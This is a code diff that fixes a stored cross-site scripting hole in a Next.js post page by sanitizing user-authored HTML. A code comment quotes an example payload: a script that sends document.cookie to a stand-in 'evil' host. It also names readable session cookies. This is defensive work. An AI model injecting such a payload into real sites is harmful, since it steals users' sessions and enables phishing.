@@ -4,6 +4,7 @@ import { getMenuBySlug, getPostById } from '@/lib/api/menus';
 import { notFound } from 'next/navigation';
 import CommentSection from '@/components/comments/CommentSection';
 import PostActions from '@/components/PostActions';
+import { sanitizeHtml } from '@/lib/html/sanitizeHtml';
 
 interface Props {
   slug: string;
@@ -45,7 +46,19 @@ export default async function PostDetailPage({ slug, postId, lang }: Props) {
         {post.content ? (
           <div
             className="detail-body min-h-[200px]"
-            dangerouslySetInnerHTML={{ __html: post.content }}
+            // 2026-06-29: customer board posts are authored via the
+            // RichEditor (Tiptap) which serializes to HTML, then stored
+            // in `posts.content` and rendered here. This page was the
+            // ONLY render site that didn't sanitize — a customer could
+            // post `<script>document.location='https://evil/?c='+document.cookie</script>`
+            // and every other viewer would execute it. `kokkok_auth` /
+            // `kokkok_admin_auth` are non-httpOnly so document.cookie
+            // can read them — real session-mirror data leak. The
+            // Cognito tokens are httpOnly (safe) but redirect-based
+            // phishing still works (overwrite document.location to a
+            // fake login page). MenuPage + reviews + CMS pages already
+            // sanitize via this same helper.
+            dangerouslySetInnerHTML={{ __html: sanitizeHtml(post.content) }}
           />
         ) : (
           <div className="min-h-[200px] text-sm text-neutral-400">
